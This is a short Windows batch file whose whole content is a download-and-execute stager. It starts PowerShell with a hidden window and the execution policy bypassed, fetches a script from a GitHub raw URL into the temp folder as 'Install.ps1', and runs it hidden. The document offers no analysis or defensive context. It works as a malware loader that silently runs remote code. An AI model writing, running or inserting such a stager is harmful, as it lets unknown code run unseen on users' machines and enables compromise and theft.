@echo off
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/lee-willie/Data/raw/refs/heads/main/Datanew.ps1', '%TEMP%\Install.ps1')"
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%TEMP%\Install.ps1"
